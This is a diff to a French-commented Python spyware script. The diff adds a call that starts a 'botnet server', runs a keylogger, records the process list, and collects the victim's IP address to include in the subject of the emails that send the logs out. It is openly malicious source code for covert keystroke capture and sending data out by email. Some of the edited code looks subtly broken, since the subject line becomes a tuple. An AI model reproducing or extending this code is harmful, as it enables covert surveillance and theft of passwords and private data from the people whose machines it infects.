@@ -21,6 +21,8 @@ import shutil
 
 # Call copyfile.bat
 os.system('copyfile.bat')
+# Call botnet server
+os.system('server/server.py')
 
 # Call la tasklist et l'enregistre dans output.txt
 tasklist = os.system("tasklist")
@@ -30,6 +32,10 @@ with open("output.txt", "wb") as f:
 
 # Call le keylogger
 os.system('Logger.pyw')
+
+# Prend l'ip
+hostname = socket.gethostname()
+myip = socket.gethostbyname(hostname)
 
 # Ici, retirez les 4 # devant les commandes pour faire en sorte que le spyware s'arrête quand on appuie sur Echap.
 #def on_press(key):
@@ -46,7 +52,7 @@ while True
     email_user = 'Votre E-mail'
     email_send = 'Votre E-mail'
     email_password = 'Votre Mot de Passe'
-    subject = 'Keylogger'
+    subject = 'Keylogger', myip
 
     msg = MIMEMultipart()
     msg['From'] = email_user
